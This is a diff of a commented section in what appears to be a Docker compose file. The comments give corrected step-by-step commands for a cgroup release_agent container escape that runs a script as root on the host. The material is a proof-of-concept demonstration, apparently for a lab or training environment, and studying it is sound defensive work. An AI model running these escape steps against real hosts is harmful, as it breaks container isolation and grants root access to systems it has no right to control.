@@ -103,16 +103,16 @@ volumes:
 #   Steps in order to replicate the escape:
 # 
 # mkdir /tmp/cgroup_mount
-# mount -t cgroup -o rmda cgroup /tmp/cgroup_mount/ # Mount the rdma control group on the directory you just created
+# mount -t cgroup -o rdma cgroup /tmp/cgroup_mount/ # Mount the rdma control group on the directory you just created
 # mkdir /tmp/cgroup_mount/test # Create a sub-control group (test)
 # echo 1 > /tmp/cgroup_mount/test/notify_on_release # Enable the notify on release feature
 # dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab) # Path from the host to the container storage
 # echo $dir"/escapingDocker" >  /tmp/cgroup_mount/release_agent # Add our script as the release agent command
-# echo '#!/bin/bash' >> $dir/escapingDocker # Create Script, this will run as root
-# echo 'ps aux > $dir' >> $dir/escapingDocker/output # Create Script
-# echo 'echo "PoC, injected through the container" > /File_on_Host' >> $dir/escapingDocker # Create Script
-# chmod a+x $dir/escapingDocker  # Set the script as executable # Set script as executable
-# sh -c "echo\$$ > /tmp/cgroup_mount/test/cgroup.procs" # Add echo $$ as a proc on the group, because it will terminate immediatly and trigger the notify on release
+# echo '#!/bin/sh' > /escapingDocker # Create Script, this will run as root
+# echo 'ps aux >> '$dir'/output' >> /escapingDocker # Create Script
+# echo 'echo "PoC, injected through the container" > /File_on_Host' >> /escapingDocker # Create Script
+# chmod a+x /escapingDocker  # Set the script as executable # Set script as executable
+# sh -c "echo \$$ > /tmp/cgroup_mount/test/cgroup.procs" # Add echo $$ as a proc on the group, because it will terminate immediatly and trigger the notify on release
 # 
 # OPTIONAL:
 # Now check the $dir/escapingDocker/output to see all the process running on the host machine
